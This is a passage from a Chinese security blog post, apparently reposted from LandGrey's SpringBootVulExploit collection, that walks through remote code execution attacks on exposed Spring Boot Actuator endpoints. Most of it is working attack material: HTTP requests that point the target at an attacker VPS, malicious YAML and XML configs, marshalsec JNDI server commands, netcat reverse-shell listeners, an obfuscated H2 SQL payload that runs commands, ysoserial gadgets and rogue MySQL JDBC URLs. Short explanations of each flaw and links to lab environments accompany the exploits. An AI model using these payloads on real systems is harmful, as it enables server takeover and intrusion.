  <span class="kt">!!java.net.URLClassLoader</span> <span class="pi">[[</span>
    <span class="kt">!!java.net.URL</span> <span class="pi">[</span><span class="s2">"</span><span class="s">http://your-vps-ip/example.jar"</span><span class="pi">]</span>
  <span class="pi">]]</span>
<span class="pi">]</span>
</code></pre></div></div>

<p>在网站根目录下放置后缀为 <code class="language-plaintext highlighter-rouge">jar</code> 的文件  <code class="language-plaintext highlighter-rouge">example.jar</code>，内容是要执行的代码，代码编写及编译方式参考 <a href="https://github.com/artsploit/yaml-payload">yaml-payload</a>。</p>

<h5 id="步骤二-设置-springcloudbootstraplocation-属性">步骤二： 设置 spring.cloud.bootstrap.location 属性</h5>

<p>spring 1.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /env
Content-Type: application/x-www-form-urlencoded

spring.cloud.bootstrap.location=http://your-vps-ip/example.yml
</code></pre></div></div>

<p>spring 2.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/env
Content-Type: application/json

{"name":"spring.cloud.bootstrap.location","value":"http://your-vps-ip/example.yml"}
</code></pre></div></div>

<h5 id="步骤三-刷新配置">步骤三： 刷新配置</h5>

<p>spring 1.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /refresh
Content-Type: application/x-www-form-urlencoded

</code></pre></div></div>

<p>spring 2.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/refresh
Content-Type: application/json

</code></pre></div></div>

<h4 id="漏洞原理-1">漏洞原理：</h4>

<ol>
  <li>spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址</li>
  <li>refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容</li>
  <li>SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作</li>
  <li>先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件</li>
  <li>然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化</li>
  <li>实例化类时执行恶意代码，造成 RCE 漏洞</li>
</ol>

<h4 id="漏洞分析-1">漏洞分析：</h4>

<p>​	<a href="https://b1ngz.github.io/exploit-spring-boot-actuator-spring-cloud-env-note/">Exploit Spring Boot Actuator 之 Spring Cloud Env 学习笔记</a></p>

<h4 id="漏洞环境-1">漏洞环境：</h4>

<p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springcloud-snakeyaml-rce">repository/springcloud-snakeyaml-rce</a></p>

<p>正常访问：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:9092/env
</code></pre></div></div>

<h3 id="0x03eureka-xstream-deserialization-rce">0x03：eureka xstream deserialization RCE</h3>

<h4 id="利用条件-6">利用条件：</h4>

<ul>
  <li>可以 POST 请求目标网站的 <code class="language-plaintext highlighter-rouge">/env</code> 接口设置属性</li>
  <li>可以 POST 请求目标网站的 <code class="language-plaintext highlighter-rouge">/refresh</code> 接口刷新配置（存在 <code class="language-plaintext highlighter-rouge">spring-boot-starter-actuator</code> 依赖）</li>
  <li>目标使用的  <code class="language-plaintext highlighter-rouge">eureka-client</code> &lt; 1.8.7（通常包含在 <code class="language-plaintext highlighter-rouge">spring-cloud-starter-netflix-eureka-client</code> 依赖中）</li>
  <li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li>
</ul>

<h4 id="利用方法-6">利用方法：</h4>

<h5 id="步骤一架设响应恶意-xstream-payload-的网站">步骤一：架设响应恶意 XStream payload 的网站</h5>

<p>提供一个依赖 Flask 并符合要求的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-xstream-rce.py">python 脚本示例</a>，作用是利用目标 Linux 机器上自带的 python 来反弹shell。</p>

<p>使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。</p>

<h5 id="步骤二监听反弹-shell-的端口">步骤二：监听反弹 shell 的端口</h5>

<p>一般使用 nc 监听端口，等待反弹 shell</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvp</span> 443
</code></pre></div></div>

<h5 id="步骤三设置-eurekaclientserviceurldefaultzone-属性">步骤三：设置 eureka.client.serviceUrl.defaultZone 属性</h5>

<p>spring 1.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /env
Content-Type: application/x-www-form-urlencoded

eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example
</code></pre></div></div>

<p>spring 2.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/env
Content-Type: application/json

{"name":"eureka.client.serviceUrl.defaultZone","value":"http://your-vps-ip/example"}
</code></pre></div></div>

<h5 id="步骤四刷新配置">步骤四：刷新配置</h5>

<p>spring 1.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /refresh
Content-Type: application/x-www-form-urlencoded

</code></pre></div></div>

<p>spring 2.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/refresh
Content-Type: application/json

</code></pre></div></div>

<h4 id="漏洞原理-2">漏洞原理：</h4>

<ol>
  <li>eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka server URL 地址</li>
  <li>refresh 触发目标机器请求远程 URL，提前架设的 fake eureka server 就会返回恶意的 payload</li>
  <li>目标机器相关依赖解析 payload，触发 XStream 反序列化，造成 RCE 漏洞</li>
</ol>

<h4 id="漏洞分析-2">漏洞分析：</h4>

<p>​	<a href="https://www.freebuf.com/column/234719.html">Spring Boot Actuator从未授权访问到getshell</a></p>

<h4 id="漏洞环境-2">漏洞环境：</h4>

<p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-eureka-xstream-rce">repository/springboot-eureka-xstream-rce</a></p>

<p>正常访问：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:9093/env
</code></pre></div></div>

<h3 id="0x04jolokia-logback-jndi-rce">0x04：jolokia logback JNDI RCE</h3>

<h4 id="利用条件-7">利用条件：</h4>

<ul>
  <li>目标网站存在 <code class="language-plaintext highlighter-rouge">/jolokia</code> 或 <code class="language-plaintext highlighter-rouge">/actuator/jolokia</code> 接口</li>
  <li>目标使用了 <code class="language-plaintext highlighter-rouge">jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean</li>
  <li>
    <p>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</p>
  </li>
  <li>JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201/7u191/8u182/11.0.1（LDAP 方式）</li>
</ul>

<h4 id="利用方法-7">利用方法：</h4>

<h5 id="步骤一查看已存在的-mbeans">步骤一：查看已存在的 MBeans</h5>

<p>访问 <code class="language-plaintext highlighter-rouge">/jolokia/list</code> 接口，查看是否存在 <code class="language-plaintext highlighter-rouge">ch.qos.logback.classic.jmx.JMXConfigurator</code> 和 <code class="language-plaintext highlighter-rouge">reloadByURL</code> 关键词。</p>

<h5 id="步骤二托管-xml-文件">步骤二：托管 xml 文件</h5>

<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 使用 python 快速开启 http server</span>

python2 <span class="nt">-m</span> SimpleHTTPServer 80
python3 <span class="nt">-m</span> http.server 80
</code></pre></div></div>

<p>在根目录放置以 <code class="language-plaintext highlighter-rouge">xml</code> 结尾的 <code class="language-plaintext highlighter-rouge">example.xml</code>  文件，内容如下：</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;configuration&gt;</span>
  <span class="nt">&lt;insertFromJNDI</span> <span class="na">env-entry-name=</span><span class="s">"ldap://your-vps-ip:1389/JNDIObject"</span> <span class="na">as=</span><span class="s">"appName"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/configuration&gt;</span>
</code></pre></div></div>

<h5 id="步骤三准备要执行的-java-代码">步骤三：准备要执行的 Java 代码</h5>

<p>编写优化过后的用来反弹 shell 的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a>  <code class="language-plaintext highlighter-rouge">JNDIObject.java</code>，</p>

<p>使用兼容低版本 jdk 的方式编译：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>javac <span class="nt">-source</span> 1.5 <span class="nt">-target</span> 1.5 JNDIObject.java
</code></pre></div></div>

<p>然后将生成的 <code class="language-plaintext highlighter-rouge">JNDIObject.class</code> 文件拷贝到 <strong>步骤二</strong> 中的网站根目录。</p>

<h5 id="步骤四架设恶意-ldap-服务">步骤四：架设恶意 ldap 服务</h5>

<p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 ldap 服务：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389
</code></pre></div></div>

<h5 id="步骤五监听反弹-shell-的端口">步骤五：监听反弹 shell 的端口</h5>

<p>一般使用 nc 监听端口，等待反弹 shell</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lv</span> 443
</code></pre></div></div>

<h5 id="步骤六从外部-url-地址加载日志配置文件">步骤六：从外部 URL 地址加载日志配置文件</h5>

<blockquote>
  <p>⚠️ 如果目标成功请求了example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。</p>
</blockquote>

<p>替换实际的 your-vps-ip 地址访问 URL 触发漏洞：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/example.xml
</code></pre></div></div>

<h4 id="漏洞原理-3">漏洞原理：</h4>

<ol>
  <li>直接访问可触发漏洞的 URL，相当于通过 jolokia 调用 <code class="language-plaintext highlighter-rouge">ch.qos.logback.classic.jmx.JMXConfigurator</code> 类的 <code class="language-plaintext highlighter-rouge">reloadByURL</code> 方法</li>
  <li>目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容</li>
  <li>目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)</li>
  <li>xml 文件中利用 <code class="language-plaintext highlighter-rouge">logback</code> 依赖的 <code class="language-plaintext highlighter-rouge">insertFormJNDI</code> 标签，设置了外部 JNDI 服务器地址</li>
  <li>目标机器请求恶意  JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞</li>
</ol>

<h4 id="漏洞分析-3">漏洞分析：</h4>

<p>​	<a href="https://xz.aliyun.com/t/4258">spring boot actuator rce via jolokia</a></p>

<h4 id="漏洞环境-3">漏洞环境：</h4>

<p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-jolokia-logback-rce">repository/springboot-jolokia-logback-rce</a></p>

<p>正常访问：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:9094/env
</code></pre></div></div>

<h3 id="0x05jolokia-realm-jndi-rce">0x05：jolokia Realm JNDI RCE</h3>

<h4 id="利用条件-8">利用条件：</h4>

<ul>
  <li>目标网站存在 <code class="language-plaintext highlighter-rouge">/jolokia</code> 或 <code class="language-plaintext highlighter-rouge">/actuator/jolokia</code> 接口</li>
  <li>目标使用了 <code class="language-plaintext highlighter-rouge">jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean</li>
  <li>目标可以请求攻击者的服务器（请求可出外网）</li>
  <li>JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u141/7u131/8u121（RMI 方式）</li>
</ul>

<h4 id="利用方法-8">利用方法：</h4>

<h5 id="步骤一查看已存在的-mbeans-1">步骤一：查看已存在的 MBeans</h5>

<p>访问 <code class="language-plaintext highlighter-rouge">/jolokia/list</code> 接口，查看是否存在 <code class="language-plaintext highlighter-rouge">type=MBeanFactory</code> 和 <code class="language-plaintext highlighter-rouge">createJNDIRealm</code> 关键词。</p>

<h5 id="步骤二准备要执行的-java-代码">步骤二：准备要执行的 Java 代码</h5>

<p>编写优化过后的用来反弹 shell 的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a>  <code class="language-plaintext highlighter-rouge">JNDIObject.java</code>。</p>

<h5 id="步骤三托管-class-文件">步骤三：托管 class 文件</h5>

<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 使用 python 快速开启 http server</span>

python2 <span class="nt">-m</span> SimpleHTTPServer 80
python3 <span class="nt">-m</span> http.server 80
</code></pre></div></div>

<p>将<strong>步骤二</strong>中编译好的 class 文件拷贝到 HTTP 服务器根目录。</p>

<h5 id="步骤四架设恶意-rmi-服务">步骤四：架设恶意 rmi 服务</h5>

<p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 rmi 服务：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://your-vps-ip:80/#JNDIObject 1389
</code></pre></div></div>

<h5 id="步骤五监听反弹-shell-的端口-1">步骤五：监听反弹 shell 的端口</h5>

<p>一般使用 nc 监听端口，等待反弹 shell</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvp</span> 443
</code></pre></div></div>

<h5 id="步骤六发送恶意-payload">步骤六：发送恶意 payload</h5>

<p>根据实际情况修改 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py">springboot-realm-jndi-rce.py</a> 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行。</p>

<h4 id="漏洞原理-4">漏洞原理：</h4>

<ol>
  <li>利用 jolokia 调用 createJNDIRealm 创建 JNDIRealm</li>
  <li>设置 connectionURL 地址为 RMI Service URL</li>
  <li>设置 contextFactory 为 RegistryContextFactory</li>
  <li>停止 Realm</li>
  <li>启动 Realm 以触发指定 RMI 地址的  JNDI 注入，造成 RCE 漏洞</li>
</ol>

<h4 id="漏洞分析-4">漏洞分析：</h4>

<p>​	<a href="https://static.anquanke.com/download/b/security-geek-2019-q1/article-10.html">Yet Another Way to Exploit Spring Boot Actuators via Jolokia</a></p>

<h4 id="漏洞环境-4">漏洞环境：</h4>

<p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-jolokia-logback-rce">repository/springboot-jolokia-logback-rce</a></p>

<p>正常访问：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:9094/env
</code></pre></div></div>

<h3 id="0x06h2-database-query-rce">0x06：h2 database query RCE</h3>

<h4 id="利用条件-9">利用条件：</h4>

<ul>
  <li>可以 POST 请求目标网站的 <code class="language-plaintext highlighter-rouge">/env</code> 接口设置属性</li>
  <li>可以 POST 请求目标网站的 <code class="language-plaintext highlighter-rouge">/restart</code> 接口重启应用（存在 spring-boot-starter-actuator 依赖）</li>
  <li>存在 <code class="language-plaintext highlighter-rouge">com.h2database.h2</code> 依赖（版本要求暂未知）</li>
</ul>

<h4 id="利用方法-9">利用方法：</h4>

<h5 id="步骤一设置-springdatasourcehikariconnection-test-query-属性">步骤一：设置 spring.datasource.hikari.connection-test-query 属性</h5>

<blockquote>
  <p>⚠️ 下面payload 中的 ‘T5’ 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发</p>
</blockquote>

<p>spring 1.x（无回显执行命令）</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /env
Content-Type: application/x-www-form-urlencoded

spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');
</code></pre></div></div>

<p>spring 2.x（无回显执行命令）</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/env
Content-Type: application/json

{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');"}
</code></pre></div></div>

<h5 id="步骤二重启应用">步骤二：重启应用</h5>

<p>spring 1.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /restart
Content-Type: application/x-www-form-urlencoded

</code></pre></div></div>

<p>spring 2.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/restart
Content-Type: application/json

</code></pre></div></div>

<h4 id="漏洞原理-5">漏洞原理：</h4>

<ol>
  <li>spring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 <code class="language-plaintext highlighter-rouge">CREATE ALIAS</code> 创建自定义函数的 SQL 语句</li>
  <li>其属性对应 HikariCP 数据库连接池的 connectionTestQuery 配置，定义一个新数据库连接之前被执行的 SQL 语句</li>
  <li>restart 重启应用，会建立新的数据库连接</li>
  <li>如果 SQL 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE 漏洞</li>
</ol>

<h4 id="漏洞分析-5">漏洞分析：</h4>

<p>​	<a href="https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database">remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database</a></p>

<h4 id="漏洞环境-5">漏洞环境：</h4>

<p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-h2-database-rce">repository/springboot-h2-database-rce</a></p>

<p>正常访问：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:9096/actuator/env
</code></pre></div></div>

<h3 id="0x07h2-database-console-jndi-rce">0x07：h2 database console JNDI RCE</h3>

<h4 id="利用条件-10">利用条件：</h4>

<ul>
  <li>存在 <code class="language-plaintext highlighter-rouge">com.h2database.h2</code> 依赖（版本要求暂未知）</li>
  <li>spring 配置中启用 h2 console  <code class="language-plaintext highlighter-rouge">spring.h2.console.enabled=true</code></li>
  <li>目标可以请求攻击者的服务器（请求可出外网）</li>
  <li>JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201/7u191/8u182/11.0.1（LDAP 方式）</li>
</ul>

<h4 id="利用方法-10">利用方法：</h4>

<h5 id="步骤一访问路由获得-jsessionid">步骤一：访问路由获得 jsessionid</h5>

<p>直接访问目标开启 h2 console 的默认路由 <code class="language-plaintext highlighter-rouge">/h2-console</code>，目标会跳转到页面 <code class="language-plaintext highlighter-rouge">/h2-console/login.jsp?jsessionid=xxxxxx</code>，记录下实际的 <code class="language-plaintext highlighter-rouge">jsessionid=xxxxxx</code> 值。</p>

<h5 id="步骤二准备要执行的-java-代码-1">步骤二：准备要执行的 Java 代码</h5>

<p>编写优化过后的用来反弹 shell 的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a>  <code class="language-plaintext highlighter-rouge">JNDIObject.java</code>，</p>

<p>使用兼容低版本 jdk 的方式编译：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>javac <span class="nt">-source</span> 1.5 <span class="nt">-target</span> 1.5 JNDIObject.java
</code></pre></div></div>

<p>然后将生成的 <code class="language-plaintext highlighter-rouge">JNDIObject.class</code> 文件拷贝到 <strong>步骤二</strong> 中的网站根目录。</p>

<h5 id="步骤三托管-class-文件-1">步骤三：托管 class 文件</h5>

<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 使用 python 快速开启 http server</span>

python2 <span class="nt">-m</span> SimpleHTTPServer 80
python3 <span class="nt">-m</span> http.server 80
</code></pre></div></div>

<p>将<strong>步骤二</strong>中编译好的 class 文件拷贝到 HTTP 服务器根目录。</p>

<h5 id="步骤四架设恶意-ldap-服务-1">步骤四：架设恶意 ldap 服务</h5>

<p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 ldap 服务：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389
</code></pre></div></div>

<h5 id="步骤五监听反弹-shell-的端口-2">步骤五：监听反弹 shell 的端口</h5>

<p>一般使用 nc 监听端口，等待反弹 shell</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lv</span> 443
</code></pre></div></div>

<h5 id="步骤六发包触发-jndi-注入">步骤六：发包触发 JNDI 注入</h5>

<p>根据实际情况，替换下面数据中的 <code class="language-plaintext highlighter-rouge">jsessionid=xxxxxx</code>、<code class="language-plaintext highlighter-rouge">www.example.com</code> 和 <code class="language-plaintext highlighter-rouge">ldap://your-vps-ip:1389/JNDIObject</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /h2-console/login.do?jsessionid<span class="o">=</span>xxxxxx
Host: www.example.com
Content-Type: application/x-www-form-urlencoded
Referer: http://www.example.com/h2-console/login.jsp?jsessionid<span class="o">=</span>xxxxxx

<span class="nv">language</span><span class="o">=</span>en&amp;setting<span class="o">=</span>Generic+H2+%28Embedded%29&amp;name<span class="o">=</span>Generic+H2+%28Embedded%29&amp;driver<span class="o">=</span>javax.naming.InitialContext&amp;url<span class="o">=</span>ldap://your-vps-ip:1389/JNDIObject&amp;user<span class="o">=</span>&amp;password<span class="o">=</span>
</code></pre></div></div>

<h4 id="漏洞分析-6">漏洞分析：</h4>

<p>​	<a href="https://mp.weixin.qq.com/s/Yn5U8WHGJZbTJsxwUU3UiQ">Spring Boot + H2数据库JNDI注入</a></p>

<h4 id="漏洞环境-6">漏洞环境：</h4>

<p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-h2-database-rce">repository/springboot-h2-database-rce</a></p>

<p>正常访问：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:9096/h2-console
</code></pre></div></div>

<h3 id="0x08mysql-jdbc-deserialization-rce">0x08：mysql jdbc deserialization RCE</h3>

<h4 id="利用条件-11">利用条件：</h4>

<ul>
  <li>可以 POST 请求目标网站的 <code class="language-plaintext highlighter-rouge">/env</code> 接口设置属性</li>
  <li>可以 POST 请求目标网站的 <code class="language-plaintext highlighter-rouge">/refresh</code> 接口刷新配置（存在 <code class="language-plaintext highlighter-rouge">spring-boot-starter-actuator</code> 依赖）</li>
  <li>目标环境中存在 <code class="language-plaintext highlighter-rouge">mysql-connector-java</code> 依赖</li>
  <li>目标可以请求攻击者的服务器（请求可出外网）</li>
</ul>

<h4 id="利用方法-11">利用方法：</h4>

<h5 id="步骤一查看环境依赖">步骤一：查看环境依赖</h5>

<p>GET 请求 <code class="language-plaintext highlighter-rouge">/env</code> 或 <code class="language-plaintext highlighter-rouge">/actuator/env</code>，搜索环境变量（classpath）中是否有 <code class="language-plaintext highlighter-rouge">mysql-connector-java</code>  关键词，并记录下其版本号（5.x 或 8.x）；</p>

<p>搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如  <code class="language-plaintext highlighter-rouge">commons-collections</code>、<code class="language-plaintext highlighter-rouge">Jdk7u21</code>、<code class="language-plaintext highlighter-rouge">Jdk8u20</code> 等；</p>

<p>搜索 <code class="language-plaintext highlighter-rouge">spring.datasource.url</code> 关键词，记录下其 <code class="language-plaintext highlighter-rouge">value</code>  值，方便后续恢复其正常 jdbc url 值。</p>

<h5 id="步骤二架设恶意-rogue-mysql-server">步骤二：架设恶意 rogue mysql server</h5>

<p>在自己控制的服务器上运行 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-jdbc-deserialization-rce.py">springboot-jdbc-deserialization-rce.py</a> 脚本，并使用 <a href="https://github.com/frohoff/ysoserial">ysoserial</a> 自定义要执行的命令：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-jar</span> ysoserial.jar CommonsCollections3 calc <span class="o">&gt;</span> payload.ser
</code></pre></div></div>

<p>在脚本<strong>同目录下</strong>生成 <code class="language-plaintext highlighter-rouge">payload.ser</code> 反序列化 payload 文件，供脚本使用。</p>

<h5 id="步骤三设置-springdatasourceurl-属性">步骤三：设置 spring.datasource.url 属性</h5>

<blockquote>
  <p>⚠️ 修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！</p>
</blockquote>

<p>mysql-connector-java 5.x 版本设置<strong>属性值</strong>为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true
</code></pre></div></div>

<p>mysql-connector-java 8.x 版本设置<strong>属性值</strong>为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true
</code></pre></div></div>

<p>spring 1.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /env
Content-Type: application/x-www-form-urlencoded

spring.datasource.url=对应属性值
</code></pre></div></div>

<p>spring 2.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/env
Content-Type: application/json

{"name":"spring.datasource.url","value":"对应属性值"}
</code></pre></div></div>

<h5 id="步骤四刷新配置-1">步骤四：刷新配置</h5>

<p>spring 1.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /refresh
Content-Type: application/x-www-form-urlencoded

</code></pre></div></div>

<p>spring 2.x</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /actuator/refresh
Content-Type: application/json

</code></pre></div></div>

<h5 id="步骤五触发数据库查询">步骤五：触发数据库查询</h5>

<p>尝试访问网站已知的数据库查询的接口，例如： <code class="language-plaintext highlighter-rouge">/product/list</code> ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发</p>

<h5 id="步骤六恢复正常-jdbc-url">步骤六：恢复正常 jdbc url</h5>

<p>反序列化漏洞利用完成后，使用 <strong>步骤三</strong> 的方法恢复 <strong>步骤一</strong> 中记录的 <code class="language-plaintext highlighter-rouge">spring.datasource.url</code> 的原始 <code class="language-plaintext highlighter-rouge">value</code> 值</p>

<h4 id="漏洞原理-6">漏洞原理：</h4>

<ol>
  <li>spring.datasource.url 属性被设置为外部恶意 mysql jdbc url 地址</li>
  <li>refresh 刷新后设置了一个新的 spring.datasource.url 属性值</li>
  <li>当网站进行数据库查询等操作时，会尝试使用恶意 mysql jdbc url 建立新的数据库连接</li>
  <li>然后恶意 mysql server 就会在建立连接的合适阶段返回反序列化 payload 数据</li>
  <li>目标依赖的 mysql-connector-java 就会反序列化设置好的 gadget，造成 RCE 漏洞</li>
</ol>

<h4 id="漏洞分析-7">漏洞分析：</h4>

<p>​	<a href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf">New-Exploit-Technique-In-Java-Deserialization-Attack</a></p>

<h4 id="漏洞环境-7">漏洞环境：</h4>

<blockquote>
  <p>需要配置 application.properties 中的 spring.datasource.url、spring.datasource.username、spring.datasource.password，保证可以正常连上 mysql 数据库，否则程序启动时就会报错退出</p>
</blockquote>

<p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-mysql-jdbc-rce">repository/springboot-mysql-jdbc-rce</a></p>

<p>正常访问：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:9097/actuator/env
</code></pre></div></div>

<p>发送完 payload 后触发漏洞：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:9097/product/list
</code></pre></div></div>


            </div>
            <div class="spacing"></div>
            <div>
	<div class="hline"></div>
	<h3><em>#</em> 申明</h3>
	<div class="spacing"></div>
	<h4><em>By: Bin4xin edited. Source from LandGrey.</em></h4>
	<h4>转载请申明本文链接：<a href="/blog/2020/Spring-boot/" target="_blank"><code-index-css><em>《不得不谈的：「Spring Boot」未授权渗透》</em></code-index-css></a></h4>

	<h3><em># Any Questions</em></h3>
	<div class="spacing"></div>
